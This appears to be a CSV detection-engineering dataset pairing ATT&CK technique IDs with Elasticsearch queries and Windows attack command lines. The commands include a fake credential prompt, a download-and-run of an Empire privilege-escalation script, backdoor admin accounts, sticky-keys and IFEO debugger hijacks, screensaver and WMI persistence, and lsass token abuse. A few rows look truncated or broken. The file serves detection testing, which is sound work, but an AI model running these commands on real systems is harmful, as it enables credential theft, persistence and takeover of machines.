T1056.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""wildcard"": {""CommandLine"": ""*UI.PromptForCredential""}},
                {""wildcard"": {""CommandLine"": ""*GetNetworkCredential""}},
                 {""match"": {""CommandLine"": ""Password""}}
          ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); write-warning $cred.GetNetworkCredential().Password",2,,
T1056.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""mavinject""}},
                 {""match"": {""CommandLine"": ""INJECTRUNNING""}},
                 {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",mavinject $pid /INJECTRUNNING; Invoke-WebRequest,2,,
T1072,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Radmin.*""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","if not exist ""%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe""  ( call ) ELSE ( echo Downloading radmin installer && bitsadmin /transfer myDownloadJob /download /priority normal ""r.msi"" /qn ) &&   &&  ""%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe""",2,,
T1078.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""net*""}}, 
              {""match"": {""CommandLine"": ""guest""}} ,
                {""match"": {""CommandLine"": ""user""}} 
                                ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",net user guest /active:yes,2,,
T1078.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""wildcard"": {""CommandLine"": ""net *""}},
                  {""wildcard"": {""CommandLine"": ""user""}},
                 {""wildcard"": {""CommandLine"": ""reg *""}},
                 {""wildcard"": {""CommandLine"": ""add""}},
                 {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Control\\Terminal Server""}},
                {""match"": {""CommandLine"": ""localgroup""}}
                           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","net user #{guest_user} /active:yes 
&& net user #{guest_user} #{guest_password} 
&& net localgroup #{local_admin_group} #{guest_user} /add 
&& net localgroup ""#{remote_desktop_users_group_name}"" #{guest_user} /add 
&& reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
&& reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f",,,
T1078.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match"": {""CommandLine"": ""/add""}},
                          {""wildcard"": {""CommandLine"": ""net*""}}
                    ]
     }
    },
               {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""/domain""}},
                         {""match"": {""CommandLine"": ""/active""}},
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"": {""CommandLine"": ""user""}},
                        {""match"": {""CommandLine"": ""administrators""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","net user art-test /add 
&& net user art-test Password123! 
&& net localgroup administrators art-test /add",2,,
T1091,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": "" Win32_LogicalDisk""}},
                {""match_phrase"": {""CommandLine"": ""drivetype=2""}},
                 {""match_phrase"": {""CommandLine"": ""DeviceID""}}        
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$RemovableDrives=@(); $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter ""drivetype=2"" | select-object -expandproperty DeviceID; 
ForEach ($Drive in $RemovableDrives); 
{; write-host ""Removable Drive Found:"" $Drive; 
New-Item -Path $Drive/T1091Test1.txt -ItemType ""file"" -Force -Value ""T1091 Test 1 has created this file to simulate malware spread to removable drives.""; }",2,,
T1133,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                
                {""match_phrase"": {""CommandLine"": ""Start chrome""}}, 
            {""match_phrase"": {""CommandLine"": ""Stop-Process""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$extList = ""fcfhplploccackoneaefokcmbjfbkenj"", ""fdcgdnkidjaadafnichfpabhfomcebme""; 
foreach ($extension in $extList) {;   New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force;  
New-ItemProperty -Path ""HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension"" -Name ""update_url"" -Value ""https://clients2.google.com/service/update2/crx"" -PropertyType ""String"" -Force}; 
Start chrome; Start-Sleep -Seconds 30; Stop-Process -Name ""chrome""",2,,
T1134.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match"": {""CommandLine"": ""-Technique""}},
                  {""match"": {""CommandLine"": ""NamedPipe""}},
                  {""match"": {""CommandLine"": ""-Verbose""}},
                 {""match_phrase"": {""CommandLine"": ""Get-System""}}        
                        ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); 
Get-System -Technique NamedPipe -Verbose",2,,
T1134.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": ""Set-ExecutionPolicy""}},
                  {""match_phrase"": {""CommandLine"": ""Get-Process""}},
                   {""match_phrase"": {""CommandLine"": ""Select ProcessName""}},
                {""match_phrase"": {""CommandLine"": ""CreateProcessFromParent""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Set-ExecutionPolicy -Scope Process Bypass -Force; 
$owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; 
Get-Process | Select ProcessName,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}}; 
$PathToAtomicsFolder\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,""cmd.exe"")",2,,
T1134.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                        {""match_phrase"": {""CommandLine"": ""Start-ATHProcessUnderSpecificParent""}},
                         {""match_phrase"": {""CommandLine"": ""System32\\WindowsPowerShell\\v1.0\\powershell.exe""}},
                        {""match"": {""CommandLine"": ""AtomicTestHarnesses""}},
                       {""match"": {""CommandLine"": ""-ParentId""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -CommandLine '-Command Start-Sleep 10' -ParentId $PID",2,,
T1134.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                             {""match_phrase"": {""CommandLine"": ""Start-ATHProcessUnderSpecificParent""}},
                             {""match"": {""CommandLine"": "" AtomicTestHarnesses""}},
                              {""match"": {""CommandLine"": ""-TestGuid""}},
                             {""match"": {""CommandLine"": ""-ParentId""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Start-ATHProcessUnderSpecificParent  -ParentId $PID -TestGuid 12345678-1234-1234-1234-123456789123,2,,
T1134.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Program Files\\Internet Explorer\\iexplore.exe""}},           
                {""wildcard"": {""CommandLine"": ""*ps1""}},
                  {""wildcard"": {""CommandLine"": ""*dll""}} 


           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",". 124a70_PPID-Spoof.ps1; $ppid=Get-Process explorer | select -expand id; 
PPID-Spoof -ppid $ppid -spawnto ""C:\Program Files\Internet Explorer\iexplore.exe"" -dllpath ""8b38ee_calc.dll""",2,,
T1197,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""set""}},    
                 {""wildcard"": {""CommandLine"": ""desktopimgdownldr*""}},
                {""match"": {""CommandLine"": ""cmd""}} 
        ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe
/lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr",2,,
T1497.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*.clear""}},
                {""match_phrase"": {""CommandLine"": ""Get-WmiObject""}},
                {""match"": {""CommandLine"": ""SELECT""}}  
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$error.clear(); 
Get-WmiObject -Query ""SELECT * FROM MSAcpi_ThermalZoneTemperature"" -ErrorAction SilentlyContinue; 
if($error) {echo ""Virtualization Environment detected""}",2,,
T1497.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""*ToLower""}},
                         {""wildcard"": {""CommandLine"": ""*contains""}},
                         {""match"": {""CommandLine"": ""Manufacturer""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"": {""CommandLine"": ""virtual""}},
                        {""match"": {""CommandLine"": ""vmware""}},
                        {""match"": {""CommandLine"": ""virtualbox""}},
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Manufacturer""; 
$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Model""; 
if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains(""vmware"")) -or ($Model.ToLower() -eq ""virtualbox"")) {write-host ""Virtualization environment detected!""} else {write-host ""No virtualization environment detected!""}",2,,
T1543.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": "" sc config""}},
                {""match_phrase"": {""CommandLine"": ""sc start""}}, 
                 {""match"": {""CommandLine"": ""-noexit""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","sc config Fax binPath= ""C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe 
-noexit -c \""write-host 'T1543.003 Test'\"""" && sc start Fax",2,,
T1543.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""delete""}},
                 
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                      
                    {""match_phrase"": {""CommandLine"": ""sc.exe create""}},
                {""match_phrase"": {""CommandLine"": ""sc.exe start""}} 
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",sc.exe create AtomicTestService_CMD binPath= 411da5_AtomicService.exe && sc.exe start AtomicTestService_CMD,2,,
T1543.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""New-Service""}},
                {""match_phrase"": {""CommandLine"": ""Start-Service""}}, 
                 {""match"": {""CommandLine"": ""-BinaryPathName""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Service -Name ""AtomicTestService_PowerShell"" -BinaryPathName ""411da5_AtomicService.exe""; Start-Service -Name ""AtomicTestService_PowerShell""",3,,
T1543.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""copy""}},
                {""wildcard"": {""CommandLine"": ""*dll""}},
                {""match_phrase"": {""CommandLine"": ""sc create""}},
                 {""match_phrase"": {""CommandLine"": ""sc config""}},
                  {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows NT\\CurrentVersion\\Svchost""}},
                  {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Services\\W64Time\\Parameters""}},
                {""match_phrase"": {""CommandLine"": ""reg add""}},
                 {""match_phrase"": {""CommandLine"": ""sc start""}}  
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","copy $PathToAtomicsFolder\T1543.003\bin\w64time.dll %systemroot%\system32\ && sc create W64Time binPath= ""c:\Windows\System32\svchost.exe -k TimeService"" type= share start=auto 
&& sc config W64Time DisplayName= ""Windows 64 Time"" && sc description W64Time ""Maintain date and time synch on all clients and services in the network"" 
&& reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost"" /v TimeService /t REG_MULTI_SZ /d ""W64Time"" /f 
&& reg add ""HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters"" /v ServiceDll /t REG_EXPAND_SZ /d ""%systemroot%\system32\w64time.dll"" /f && sc start W64Time",,,
T1546.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""assoc""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",assoc .hta=txtfile,2,,
T1546.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                  {""match_phrase"":{""CommandLine"": ""Control Panel\\Desktop""}},  
                   {""wildcard"":{""CommandLine"": ""reg*""}},
                   {""match"":{""CommandLine"": ""add""}}      
                ]
     }
    },
    {""bool"":{
     ""should"":[ 
                {""match_phrase"": {""CommandLine"": ""ScreenSaveActive""}},
                {""match_phrase"": {""CommandLine"": ""ScreenSaveTimeout""}},
                {""match_phrase"": {""CommandLine"": ""ScreenSaverIsSecure""}},
                {""match_phrase"": {""CommandLine"": ""SCRNSAVE.EXE""}}
                     ]
     }
    }
                 ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr""
 && reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f 
&& reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f 
&& reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f 
&& reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f 
&& shutdown /r /t 0",2,,
T1546.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""TargetInstance.SystemUpTime""}},
                {""match_phrase"": {""CommandLine"": ""notepad.exe""}},
                {""match_phrase"": {""CommandLine"": "" New-CimInstance""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';                 
EventNameSpace='root\CimV2';                 
QueryLanguage=""WQL"";                
 Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325""}; 
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; 
$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';                 
CommandLineTemplate=""$($Env:SystemRoot)\System32\notepad.exe"";}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs; 
$FilterToConsumerArgs = @{; Filter = [Ref] $Filter; Consumer = [Ref] $Consumer; }; 
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs",2,,
T1546.007,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""add""}},
                 {""wildcard"": {""CommandLine"": ""*dll""}},
                {""wildcard"": {""CommandLine"": ""netsh*""}} 
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",c helper C:\Path\file.dll,,,
T1546.008,"
{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                  {""match_phrase"":{""CommandLine"": ""Microsoft\\Windows NT\\CurrentVersion\\Image""}},  
                   {""wildcard"":{""CommandLine"": ""*trim""}},      
                ]
     }
    },
    {""bool"":{
     ""should"":[ 
                {""match_phrase"": {""CommandLine"": ""osk.exe""}},
                {""match_phrase"": {""CommandLine"": ""sethc.exe""}},
                {""match_phrase"": {""CommandLine"": ""utilman.exe""}},
                {""match_phrase"": {""CommandLine"": ""magnify.exe""}},
                 {""match_phrase"": {""CommandLine"": ""narrator.exe""}},
                 {""match_phrase"": {""CommandLine"": "" DisplaySwitch.exe""}},
                {""match_phrase"": {""CommandLine"": "" atbroker.exe""}}
                     ]
     }
    }
                 ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$input_table = ""osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe"".split("",""); $Name = ""Debugger""; 
$Value = ""C:\windows\system32\cmd.exe""; 
Foreach ($item in $input_table){;   $item = $item.trim();   
$registryPath = ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"";   
IF(!(Test-Path $registryPath));   {;     New-Item -Path $registryPath -Force;     New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force;   };   
ELSE;   {;     New-ItemProperty -Path $registryPath -Name $name -Value $Value;   }; }",2,,
T1546.008,"   {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""copy""}},
                {""match"": {""CommandLine"": ""icacls""}},
                {""match"": {""CommandLine"": ""takeown""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe 
&& takeown /F C:\Windows\System32\sethc.exe /A && icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t 
&& copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe",2,,
